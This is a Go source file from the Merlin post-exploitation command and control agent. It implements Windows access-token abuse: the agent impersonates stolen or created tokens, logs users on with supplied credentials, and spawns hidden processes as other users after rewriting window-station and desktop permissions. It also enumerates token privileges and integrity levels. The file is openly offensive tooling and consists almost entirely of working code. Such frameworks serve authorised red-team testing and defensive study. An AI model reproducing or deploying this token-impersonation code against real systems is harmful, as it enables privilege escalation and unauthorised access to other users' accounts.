//go:build windows

/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package tokens

import (
	// Standard
	"bytes"
	"encoding/binary"
	"fmt"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"

	// X Packages
	"golang.org/x/sys/windows"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/v2/cli"
	"github.com/Ne0nd0g/merlin-agent/v2/os/windows/api/advapi32"
	"github.com/Ne0nd0g/merlin-agent/v2/os/windows/api/user32"
	"github.com/Ne0nd0g/merlin-agent/v2/os/windows/pkg/pipes"
)

// LOGON32_LOGON_ constants from winbase.h
// The type of logon operation to perform
const (
	LOGON32_LOGON_INTERACTIVE       uint32 = 2
	LOGON32_LOGON_NETWORK           uint32 = 3
	LOGON32_LOGON_BATCH             uint32 = 4
	LOGON32_LOGON_SERVICE           uint32 = 5
	LOGON32_LOGON_UNLOCK            uint32 = 7
	LOGON32_LOGON_NETWORK_CLEARTEXT uint32 = 8
	LOGON32_LOGON_NEW_CREDENTIALS   uint32 = 9
)

// LOGON32_PROVIDER_ constants
// The logon provider
const (
	LOGON32_PROVIDER_DEFAULT uint32 = iota
	LOGON32_PROVIDER_WINNT35
	LOGON32_PROVIDER_WINNT40
	LOGON32_PROVIDER_WINNT50
	LOGON32_PROVIDER_VIRTUAL
)

// LOGON_ The logon option
const (
	LOGON_WITH_PROFILE        uint32 = 0x1
	LOGON_NETCREDENTIALS_ONLY uint32 = 0x2
)

var Token windows.Token

// ApplyToken applies any stolen or created Windows access token's to the current thread
func ApplyToken() error {
	cli.Message(cli.DEBUG, "entering tokens.ApplyToken()")

	// Verify a token has been created/stolen and assigned to the global variable
	if Token != 0 {
		// Apply the token to this process thread
		return advapi32.ImpersonateLoggedOnUser(Token)
	}
	return nil
}

// CreateProcessWithToken creates a new process as the user associated with the passed in token
// STDOUT/STDERR is redirected to an anonymous pipe and collected after execution to be returned
// This requires administrative privileges or at least the SE_IMPERSONATE_NAME privilege
func CreateProcessWithToken(hToken windows.Token, application string, args []string) (stdout string, stderr string) {
	cli.Message(cli.DEBUG, "entering tokens.CreateProcessWithToken()")
	if application == "" {
		stderr = "a program must be provided for the CreateProcessWithToken call"
		return
	}

	priv := "SeImpersonatePrivilege"
	name, err := syscall.UTF16PtrFromString(priv)
	if err != nil {
		stderr = fmt.Sprintf("there was an error converting the privilege \"%s\" to LPCWSTR: %s", priv, err)
	}

	// Verify that the calling process has the SE_IMPERSONATE_NAME privilege
	var systemName uint16
	var luid windows.LUID
	err = windows.LookupPrivilegeValue(&systemName, name, &luid)
	if err != nil {
		stderr = err.Error()
		return
	}

	hasPriv, err := hasPrivilege(windows.GetCurrentProcessToken(), luid)
	if err != nil {
		stderr = "the provided access token does not have the SeImpersonatePrivilege and can't be used to create a process"
		return
	}

	// TODO try to enable the priv before returning with an error
	if !hasPriv {
		stderr = "the provided access token does not have the SeImpersonatePrivilege and therefore can't be used to call CreateProcessWithToken"
		return
	}

	// Get Process Token TOKEN_STATISTICS structure
	statProc, err := GetTokenStats(hToken)
	if err != nil {
		stderr = err.Error()
		return
	}
	if statProc.TokenType != windows.TokenPrimary {
		stderr = "A PRIMARY Windows access token was not provided to tokens.CreateProcessWithToken()"
		return
	}
	// TODO verify the provided token has the TOKEN_QUERY, TOKEN_DUPLICATE, and TOKEN_ASSIGN_PRIMARY access rights

	// Search PATH environment variable to retrieve the application's absolute path
	application, err = exec.LookPath(application)
	if err != nil {
		stderr = fmt.Sprintf("there was an error resolving the absolute path for %s: %s", application, err)
		return
	}

	// Convert the program to a LPCWSTR
	lpApplicationName, err := syscall.UTF16PtrFromString(application)
	if err != nil {
		stderr = fmt.Sprintf("there was an error converting the application name \"%s\" to LPCWSTR: %s", application, err)
		return
	}

	// Convert the program to a LPCWSTR
	lpCommandLine, err := syscall.UTF16PtrFromString(strings.Join(args, " "))
	if err != nil {
		stderr = fmt.Sprintf("there was an error converting the application arguments \"%s\" to LPCWSTR: %s", args, err)
		return
	}

	// Setup pipes to retrieve output
	stdInRead, _, stdOutRead, stdOutWrite, stdErrRead, stdErrWrite, err := pipes.CreateAnonymousPipes()
	if err != nil {
		stderr = err.Error()
		return
	}

	sessionToken, err := GetTokenSessionId(hToken)
	if err != nil {
		stderr = err.Error()
		return
	}
	var sessionCurrent uint32
	err = windows.ProcessIdToSessionId(windows.GetCurrentProcessId(), &sessionCurrent)
	if err != nil {
		stderr = err.Error()
		return
	}

	// If the calling process (the Merlin agent) and the token are in different window sessions we must allow the token
	// user to access the calling session if we are not going to spawn the process in the token's session
	// Never figured out if setting the lpDesktop for the STARTUPINFO structure would work
	if sessionCurrent != sessionToken {
		// Retrieve the passed in token's user information structure to leverage the SID later
		user, err := hToken.GetTokenUser()
		if err != nil {
			stderr = fmt.Sprintf("there was an error calling GetTokenUser: %s\n", err)
			return
		}

		// Create the trustee to add to an ACE
		trustee := windows.TRUSTEE{
			MultipleTrustee:          nil,
			MultipleTrusteeOperation: windows.NO_MULTIPLE_TRUSTEE,
			TrusteeForm:              windows.TRUSTEE_IS_SID,
			TrusteeType:              windows.TRUSTEE_IS_USER,
			TrusteeValue:             windows.TrusteeValueFromSID(user.User.Sid),
		}

		// Create the ACE
		// WINSTA_ALL_ACCESS := 0x37F   		// WINSTA_ALL_ACCESS (0x37F)	All possible access rights for the window station.
		// WINSTA_READATTRIBUTES := 0x0002 // (0x0002L) Required to read the attributes of a window station object. This attribute includes color settings and other global window station properties.
		// WINSTA_WRITEATTRIBUTES := 0x0010 // (0x0010L) Required to modify the attributes of a window station object. The attributes include color settings and other global window station properties.
		// WINSTA_ENUMDESKTOPS := 0x0001 // (0x0001L) Required to enumerate existing desktop objects.
		// WINSTA_ENUMERATE := 0x0100 // (0x0100L)	Required for the window station to be enumerated.
		// WINSTA_ACCESSCLIPBOARD := 0x0004   // (0x0004L) Required to use the clipboard.
		WINSTA_ACCESSGLOBALATOMS := 0x0020 // (0x0020L)	Required to manipulate global atoms. REQUIRED
		// WINSTA_CREATEDESKTOP := 0x0008     // (0x0008L)	Required to create new desktop objects on the window station.
		WINSTA_EXITWINDOWS := 0x0040 // (0x0040L)	Required to successfully call the ExitWindows or ExitWindowsEx function. Window stations can be shared by users and this access type can prevent other users of a window station from logging off the window station owner. REQUIRED
		// WINSTA_READSCREEN := 0x0200  // (0x0200L)	Required to access screen contents.
		ace := windows.EXPLICIT_ACCESS{
			AccessPermissions: windows.ACCESS_MASK(WINSTA_ACCESSGLOBALATOMS | WINSTA_EXITWINDOWS | windows.READ_CONTROL), // WINSTA_CREATEDESKTOP | WINSTA_READSCREEN | WINSTA_ACCESSCLIPBOARD | WINSTA_WRITEATTRIBUTES | WINSTA_ENUMDESKTOPS | WINSTA_ENUMERATE | WINSTA_READATTRIBUTES |
			AccessMode:        windows.SET_ACCESS,
			Inheritance:       windows.NO_INHERITANCE,
			Trustee:           trustee,
		}

		si := windows.SECURITY_INFORMATION(windows.DACL_SECURITY_INFORMATION | windows.OWNER_SECURITY_INFORMATION | windows.ATTRIBUTE_SECURITY_INFORMATION | windows.GROUP_SECURITY_INFORMATION | windows.PROTECTED_DACL_SECURITY_INFORMATION | windows.UNPROTECTED_DACL_SECURITY_INFORMATION)

		// Get a handle to the window station
		hWinsta, err := user32.GetProcessWindowStation()
		if err != nil {
			stderr = err.Error()
			return
		}

		// Retrieve security information (namely the DACL) for the window station
		sdStation, err := windows.GetSecurityInfo(windows.Handle(hWinsta), windows.SE_KERNEL_OBJECT, si)
		if err != nil {
			stderr = fmt.Sprintf("there was an error calling windows.GetSecurityInfo with the window station handle: %s", err)
			return
		}
		//stdout += fmt.Sprintf("Window Station SDDL: %s\n", sdStation)

		// Add the new ACE for the token user to the existing security descriptor for the window station
		sdStationNew, err := windows.BuildSecurityDescriptor(nil, nil, []windows.EXPLICIT_ACCESS{ace}, nil, sdStation)
		if err != nil {
			stderr = fmt.Sprintf("there was an error calling windows.BuildSecurityDescriptor for the station: %s\n", err)
			return
		}
		//stdout += fmt.Sprintf("New window station security descriptor: %+v\n", sdStationNew)

		// Update the window station security descriptor with the new DACL that contains access rights for the token user
		err = windows.SetKernelObjectSecurity(windows.Handle(hWinsta), windows.DACL_SECURITY_INFORMATION, sdStationNew)
		if err != nil {
			stderr = fmt.Sprintf("there was an error calling windows.SetKernelObjectSecurity: %s\n", err)
			return
		}

		// Defer restoring the original security descriptor for the window station
		defer func() {
			err = windows.SetKernelObjectSecurity(windows.Handle(hWinsta), windows.DACL_SECURITY_INFORMATION, sdStation)
			if err != nil {
				stderr += fmt.Sprintf("\nthere was an error calling windows.SetKernelObjectSecurity to restore the "+
					"original security descriptor for the window station: %s\n", err)
			}
		}()

		// Get a handle to the desktop securable object
		hDesktop, err := user32.GetThreadDesktop(windows.GetCurrentThreadId())
		if err != nil {
			stderr = err.Error()
			return
		}

		// Get the security information (namely the DACL) for the desktop object
		sdDesktop, err := windows.GetSecurityInfo(windows.Handle(hDesktop), windows.SE_KERNEL_OBJECT, si)
		if err != nil {
			stderr = fmt.Sprintf("there was an error calling windows.GetSecurityInfo with the desktop object handle: %s", err)
			return
		}
		//stdout += fmt.Sprintf("Window Desktop SDDL: %s\n", sdDesktop)

		// Update the ACE with the required permissions for the desktop object windows.GENERIC_ALL
		DESKTOP_WRITEOBJECTS := 0x0080 // (0x0080L)	Required to write objects on the desktop.
		DESKTOP_READOBJECTS := 0x0001  // (0x0001L)	Required to read objects on the desktop.
		// DESKTOP_CREATEMENU := 0x0004   // (0x0004L)	Required to create a menu on the desktop.
		DESKTOP_CREATEWINDOW := 0x0002 // (0x0002L)	Required to create a window on the desktop. REQUIRED
		// DESKTOP_ENUMERATE := 0x0040    // (0x0040L)	Required for the desktop to be enumerated.
		//ace.AccessPermissions = windows.ACCESS_MASK(DESKTOP_CREATEWINDOW) // DESKTOP_ENUMERATE | DESKTOP_CREATEMENU | DESKTOP_READOBJECTS | DESKTOP_WRITEOBJECTS | WORKS WHEN TOKEN BELONGS TO ADMIN OR PRIMARY USER OF DESKTOP UNSURE WHICH
		//ace.AccessPermissions = windows.ACCESS_MASK(windows.GENERIC_ALL) // WORKS
		ace.AccessPermissions = windows.ACCESS_MASK(DESKTOP_CREATEWINDOW | DESKTOP_READOBJECTS | DESKTOP_WRITEOBJECTS) // DESKTOP_ENUMERATE | DESKTOP_CREATEMENU

		// Add the new ACE for the token user to the existing security descriptor for the desktop object
		sdDesktopNew, err := windows.BuildSecurityDescriptor(nil, nil, []windows.EXPLICIT_ACCESS{ace}, nil, sdDesktop)
		if err != nil {
			stderr = fmt.Sprintf("there was an error calling windows.BuildSecurityDescriptor for the new desktop security descriptor: %s\n", err)
			return
		}
		//stdout += fmt.Sprintf("New Security Descriptor (desktop): %+v\n", sdDesktopNew)

		// Update the desktop security descriptor with the new DACL that contains access rights for the token user
		err = windows.SetKernelObjectSecurity(windows.Handle(hDesktop), windows.DACL_SECURITY_INFORMATION, sdDesktopNew)
		if err != nil {
			stderr = fmt.Sprintf("there was an error calling windows.SetKernelObjectSecurity to add an updated DACL to the desktop object: %s\n", err)
			return
		}

		// Defer restoring the original security descriptor for the desktop
		defer func() {
			err = windows.SetKernelObjectSecurity(windows.Handle(hDesktop), windows.DACL_SECURITY_INFORMATION, sdDesktop)
			if err != nil {
				stderr += fmt.Sprintf("there was an error calling windows.SetKernelObjectSecurity to restore the original desktop security descriptor: %s\n", err)
			}
		}()
	}

	var lpCurrentDirectory uint16 = 0
	lpStartupInfo := &windows.StartupInfo{
		StdInput:   stdInRead,
		StdOutput:  stdOutWrite,
		StdErr:     stdErrWrite,
		Flags:      windows.STARTF_USESTDHANDLES | windows.STARTF_USESHOWWINDOW,
		ShowWindow: windows.SW_HIDE,
	}
	lpProcessInformation := &windows.ProcessInformation{}
	LOGON_NETCREDENTIALS_ONLY := uint32(0x2) // Could not find this constant in the windows package
	dwLogonFlags := LOGON_NETCREDENTIALS_ONLY
	dwCreationFlags := 0
	var lpEnvironment uintptr

	// Parse optional arguments
	var applicationName uintptr
	if *lpApplicationName == 0 {
		applicationName = 0
	} else {
		applicationName = uintptr(unsafe.Pointer(lpApplicationName))
	}

	var commandLine uintptr
	if *lpCommandLine == 0 {
		commandLine = 0
	} else {
		commandLine = uintptr(unsafe.Pointer(lpCommandLine))
	}

	var currentDirectory uintptr
	if lpCurrentDirectory == 0 {
		currentDirectory = 0
	} else {
		currentDirectory = uintptr(unsafe.Pointer(&lpCurrentDirectory))
	}

	err = advapi32.CreateProcessWithTokenW(
		uintptr(hToken),
		uintptr(dwLogonFlags),
		applicationName,
		commandLine,
		uintptr(dwCreationFlags),
		lpEnvironment,
		//uintptr(unsafe.Pointer(lpCurrentDirectory)),
		currentDirectory,
		uintptr(unsafe.Pointer(lpStartupInfo)),
		uintptr(unsafe.Pointer(lpProcessInformation)),
	)
	if err != nil {
		stderr = err.Error()
		return
	}

	stdout += fmt.Sprintf("Created %s process with an ID of %d\n", application, lpProcessInformation.ProcessId)

	// Close the "write" pipe handles
	err = pipes.ClosePipes(0, 0, 0, stdOutWrite, 0, stdErrWrite)
	if err != nil {
		stderr = err.Error()
		return
	}

	// Read from the pipes
	var out string
	_, out, stderr, err = pipes.ReadPipes(0, stdOutRead, stdErrRead)
	if err != nil {
		stderr += err.Error()
	}
	stdout += out

	// Close the "read" pipe handles
	err = pipes.ClosePipes(stdInRead, 0, stdOutRead, 0, stdErrRead, 0)
	if err != nil {
		stderr += err.Error()
		return
	}

	return
}

// GetCurrentUserAndGroup retrieves the username and the user's primary group for the calling process primary token
func GetCurrentUserAndGroup() (username, group string, err error) {
	token := windows.GetCurrentProcessToken()
	username, err = GetTokenUsername(token)
	if err != nil {
		return
	}

	grp, err := token.GetTokenPrimaryGroup()
	if err != nil {
		return
	}

	group = grp.PrimaryGroup.String()
	return
}

// GetTokenIntegrityLevel enumerates the integrity level for the provided token and returns it as a string
func GetTokenIntegrityLevel(token windows.Token) (string, error) {
	cli.Message(cli.DEBUG, "entering tokens.GetTokenIntegrityLevel()")
	var info byte
	var returnedLen uint32
	// Call the first time to get the output structure size
	err := windows.GetTokenInformation(token, windows.TokenIntegrityLevel, &info, 0, &returnedLen)
	if err != windows.ERROR_INSUFFICIENT_BUFFER {
		return "", fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
	}

	// Knowing the structure size, call again
	TokenIntegrityInformation := bytes.NewBuffer(make([]byte, returnedLen))
	err = windows.GetTokenInformation(token, windows.TokenIntegrityLevel, &TokenIntegrityInformation.Bytes()[0], returnedLen, &returnedLen)
	if err != nil {
		return "", fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
	}

	// Read the buffer into a byte slice
	bLabel := make([]byte, returnedLen)
	err = binary.Read(TokenIntegrityInformation, binary.LittleEndian, &bLabel)
	if err != nil {
		return "", fmt.Errorf("there was an error reading bytes for the token integrity level: %s", err)
	}

	// Integrity level is in the Attributes portion of the structure, a DWORD, the last four bytes
	// https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_mandatory_label
	// https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-sid_and_attributes
	integrityLevel := binary.LittleEndian.Uint32(bLabel[returnedLen-4:])
	return integrityLevelToString(integrityLevel), nil
}

// GetTokenPrivileges enumerates the token's privileges and attributes and returns them
func GetTokenPrivileges(token windows.Token) (privs []windows.LUIDAndAttributes, err error) {
	cli.Message(cli.DEBUG, "entering tokens.GetTokenPrivileges()")
	// Get the privileges and attributes
	// Call to get structure size
	var returnedLen uint32
	err = windows.GetTokenInformation(token, windows.TokenPrivileges, nil, 0, &returnedLen)
	if err != syscall.ERROR_INSUFFICIENT_BUFFER {
		err = fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
		return
	}

	// Call again to get the actual structure
	info := bytes.NewBuffer(make([]byte, returnedLen))
	err = windows.GetTokenInformation(token, windows.TokenPrivileges, &info.Bytes()[0], returnedLen, &returnedLen)
	if err != nil {
		err = fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
		return
	}

	var privilegeCount uint32
	err = binary.Read(info, binary.LittleEndian, &privilegeCount)
	if err != nil {
		err = fmt.Errorf("there was an error reading TokenPrivileges bytes to privilegeCount: %s", err)
		return
	}

	// Read in the LUID and Attributes
	for i := 1; i <= int(privilegeCount); i++ {
		var priv windows.LUIDAndAttributes
		err = binary.Read(info, binary.LittleEndian, &priv)
		if err != nil {
			err = fmt.Errorf("there was an error reading LUIDAttributes to bytes: %s", err)
			return
		}
		privs = append(privs, priv)
	}
	return
}

// GetTokenStats uses the GetTokenInformation Windows API call to gather information about the provided access token
// by retrieving the token's associated TOKEN_STATISTICS structure
func GetTokenStats(token windows.Token) (tokenStats TOKEN_STATISTICS, err error) {
	cli.Message(cli.DEBUG, "entering tokens.GetTokenStats()")
	// Determine the size needed for the structure
	// BOOL GetTokenInformation(
	//  [in]            HANDLE                  TokenHandle,
	//  [in]            TOKEN_INFORMATION_CLASS TokenInformationClass,
	//  [out, optional] LPVOID                  TokenInformation,
	//  [in]            DWORD                   TokenInformationLength,
	//  [out]           PDWORD                  ReturnLength
	//);
	var returnLength uint32
	err = windows.GetTokenInformation(token, windows.TokenStatistics, nil, 0, &returnLength)
	if err != nil && err != syscall.ERROR_INSUFFICIENT_BUFFER {
		err = fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
		return
	}

	// Make the call with the known size of the object
	info := bytes.NewBuffer(make([]byte, returnLength))
	var returnLength2 uint32
	err = windows.GetTokenInformation(token, windows.TokenStatistics, &info.Bytes()[0], returnLength, &returnLength2)
	if err != nil {
		err = fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
		return
	}

	err = binary.Read(info, binary.LittleEndian, &tokenStats)
	if err != nil {
		err = fmt.Errorf("there was an error reading binary into the TOKEN_STATISTICS structure: %s", err)
		return
	}
	return
}

// GetTokenUsername returns the domain and username associated with the provided token as a string
func GetTokenUsername(token windows.Token) (username string, err error) {
	cli.Message(cli.DEBUG, "entering tokens.GetTokenUsername()")
	user, err := token.GetTokenUser()
	if err != nil {
		return "", fmt.Errorf("there was an error calling GetTokenUser(): %s", err)
	}

	account, domain, _, err := user.User.Sid.LookupAccount("")
	if err != nil {
		return "", fmt.Errorf("there was an error calling SID.LookupAccount(): %s", err)
	}

	username = fmt.Sprintf("%s\\%s", domain, account)
	return
}

// GetTokenSessionId returns the session ID associated with the token
func GetTokenSessionId(token windows.Token) (sessionId uint32, err error) {
	cli.Message(cli.DEBUG, "entering tokens.GetTokenSessionId()")

	// Determine the size needed for the structure
	var returnLength uint32
	err = windows.GetTokenInformation(token, windows.TokenSessionId, nil, 0, &returnLength)
	if err != nil && err != syscall.ERROR_INSUFFICIENT_BUFFER {
		err = fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
		return
	}

	// Make the call with the known size of the object
	info := bytes.NewBuffer(make([]byte, returnLength))
	var returnLength2 uint32
	err = windows.GetTokenInformation(token, windows.TokenSessionId, &info.Bytes()[0], returnLength, &returnLength2)
	if err != nil {
		err = fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
		return
	}

	err = binary.Read(info, binary.LittleEndian, &sessionId)
	if err != nil {
		err = fmt.Errorf("there was an error reading binary into the TokenSessionId DWORD: %s", err)
		return
	}
	return
}

// hasPrivilege checks the provided access token to see if it contains the provided privilege
func hasPrivilege(token windows.Token, privilege windows.LUID) (has bool, err error) {
	cli.Message(cli.DEBUG, "entering tokens.hasPrivilege()")
	// Get the privileges and attributes
	// Call to get structure size
	var returnedLen uint32
	err = windows.GetTokenInformation(token, windows.TokenPrivileges, nil, 0, &returnedLen)
	if err != syscall.ERROR_INSUFFICIENT_BUFFER {
		err = fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
		return
	}

	// Call again to get the actual structure
	info := bytes.NewBuffer(make([]byte, returnedLen))
	err = windows.GetTokenInformation(token, windows.TokenPrivileges, &info.Bytes()[0], returnedLen, &returnedLen)
	if err != nil {
		err = fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
		return
	}

	var privilegeCount uint32
	err = binary.Read(info, binary.LittleEndian, &privilegeCount)
	if err != nil {
		err = fmt.Errorf("there was an error reading TokenPrivileges bytes to privilegeCount: %s", err)
		return
	}

	// Read in the LUID and Attributes
	var privs []windows.LUIDAndAttributes
	for i := 1; i <= int(privilegeCount); i++ {
		var priv windows.LUIDAndAttributes
		err = binary.Read(info, binary.LittleEndian, &priv)
		if err != nil {
			err = fmt.Errorf("there was an error reading LUIDAttributes to bytes: %s", err)
			return
		}
		privs = append(privs, priv)
	}

	// Iterate over provided token's privileges and return true if it is present
	for _, priv := range privs {
		if priv.Luid == privilege {
			return true, nil
		}
	}
	return false, nil
}

// integrityLevelToString converts an access token integrity level to a string
// https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids
func integrityLevelToString(level uint32) string {
	switch level {
	case 0x00000000: // SECURITY_MANDATORY_UNTRUSTED_RID
		return "Untrusted"
	case 0x00001000: // SECURITY_MANDATORY_LOW_RID
		return "Low"
	case 0x00002000: // SECURITY_MANDATORY_MEDIUM_RID
		return "Medium"
	case 0x00002100: // SECURITY_MANDATORY_MEDIUM_PLUS_RID
		return "Medium High"
	case 0x00003000: // SECURITY_MANDATORY_HIGH_RID
		return "High"
	case 0x00004000: // SECURITY_MANDATORY_SYSTEM_RID
		return "System"
	case 0x00005000: // SECURITY_MANDATORY_PROTECTED_PROCESS_RID
		return "Protected Process"
	default:
		return fmt.Sprintf("Uknown integrity level: %d", level)
	}
}

// ImpersonationToString converts a SECURITY_IMPERSONATION_LEVEL uint32 value to it's associated string
func ImpersonationToString(level uint32) string {
	switch level {
	case windows.SecurityAnonymous:
		return "Anonymous"
	case windows.SecurityIdentification:
		return "Identification"
	case windows.SecurityImpersonation:
		return "Impersonation"
	case windows.SecurityDelegation:
		return "Delegation"
	default:
		return fmt.Sprintf("unknown SECURITY_IMPERSONATION_LEVEL: %d", level)
	}
}

// LogonUser creates a new logon session for the user according to the provided logon type and returns a Windows access
// token for that logon session. This is a wrapper function that includes additional validation checks
func LogonUser(user string, password string, domain string, logonType uint32, logonProvider uint32) (hToken windows.Token, err error) {
	cli.Message(cli.DEBUG, "entering tokens.LogonUser()")
	if user == "" {
		err = fmt.Errorf("a username must be provided for the LogonUser call")
		return
	}

	if password == "" {
		err = fmt.Errorf("a password must be provided for the LogonUser call")
		return
	}

	if logonType <= 0 {
		err = fmt.Errorf("an invalid logonType was provided to the LogonUser call: %d", logonType)
		return
	}

	// Check for UPN format (e.g., rastley@acme.com)
	if strings.Contains(user, "@") {
		temp := strings.Split(user, "@")
		user = temp[0]
		domain = temp[1]
	}

	// Check for domain format (e.g., ACME\rastley)
	if strings.Contains(user, "\\") {
		temp := strings.Split(user, "\\")
		user = temp[1]
		domain = temp[0]
	}

	// Check for an empty or missing domain; used with local user accounts
	if domain == "" {
		domain = "."
	}

	// Convert username to LPCWSTR
	pUser, err := syscall.UTF16PtrFromString(user)
	if err != nil {
		err = fmt.Errorf("there was an error converting the username \"%s\" to LPCWSTR: %s", user, err)
		return
	}

	// Convert the domain to LPCWSTR
	pDomain, err := syscall.UTF16PtrFromString(domain)
	if err != nil {
		err = fmt.Errorf("there was an error converting the domain \"%s\" to LPCWSTR: %s", domain, err)
		return
	}

	// Convert the password to LPCWSTR
	pPassword, err := syscall.UTF16PtrFromString(password)
	if err != nil {
		err = fmt.Errorf("there was an error converting the password \"%s\" to LPCWSTR: %s", password, err)
		return
	}

	token, err := advapi32.LogonUser(pUser, pDomain, pPassword, logonType, logonProvider)
	if err != nil {
		return
	}

	// Convert *unsafe.Pointer to windows.Token
	// windows.Token -> windows.Handle -> uintptr
	hToken = (windows.Token)(*token)
	return
}

// PrivilegeAttributeToString converts a privilege attribute integer to a string
func PrivilegeAttributeToString(attribute uint32) string {
	// https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_privileges
	switch attribute {
	case 0x00000000:
		return ""
	case 0x00000001:
		return "SE_PRIVILEGE_ENABLED_BY_DEFAULT"
	case 0x00000002:
		return "SE_PRIVILEGE_ENABLED"
	case 0x00000001 | 0x00000002:
		return "SE_PRIVILEGE_ENABLED_BY_DEFAULT,SE_PRIVILEGE_ENABLED"
	case 0x00000004:
		return "SE_PRIVILEGE_REMOVED"
	case 0x80000000:
		return "SE_PRIVILEGE_USED_FOR_ACCESS"
	case 0x00000001 | 0x00000002 | 0x00000004 | 0x80000000:
		return "SE_PRIVILEGE_VALID_ATTRIBUTES"
	default:
		return fmt.Sprintf("Unknown SE_PRIVILEGE_ value: 0x%X", attribute)
	}
}

// PrivilegeToString converts a LUID to it's string representation
func PrivilegeToString(priv windows.LUID) string {
	p, err := advapi32.LookupPrivilegeName(priv)
	if err != nil {
		return err.Error()
	}
	return p
}

// TokenTypeToString converts a TOKEN_TYPE uint32 value to it's associated string
func TokenTypeToString(tokenType uint32) string {
	switch tokenType {
	case windows.TokenPrimary:
		return "Primary"
	case windows.TokenImpersonation:
		return "Impersonation"
	default:
		return fmt.Sprintf("unknown TOKEN_TYPE: %d", tokenType)
	}
}

// Structures

// TOKEN_STATISTICS contains information about an access token
// https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_statistics
//
//	typedef struct _TOKEN_STATISTICS {
//	 LUID                         TokenId;
//	 LUID                         AuthenticationId;
//	 LARGE_INTEGER                ExpirationTime;
//	 TOKEN_TYPE                   TokenType;
//	 SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
//	 DWORD                        DynamicCharged;
//	 DWORD                        DynamicAvailable;
//	 DWORD                        GroupCount;
//	 DWORD                        PrivilegeCount;
//	 LUID                         ModifiedId;
//	} TOKEN_STATISTICS, *PTOKEN_STATISTICS;
type TOKEN_STATISTICS struct {
	TokenId            windows.LUID
	AuthenticationId   windows.LUID
	ExpirationTime     int64
	TokenType          uint32 // Enum of TokenPrimary 0 or TokenImpersonation 1
	ImpersonationLevel uint32 // Enum
	DynamicCharged     uint32
	DynamicAvailable   uint32
	GroupCount         uint32
	PrivilegeCount     uint32
	ModifiedId         windows.LUID
}
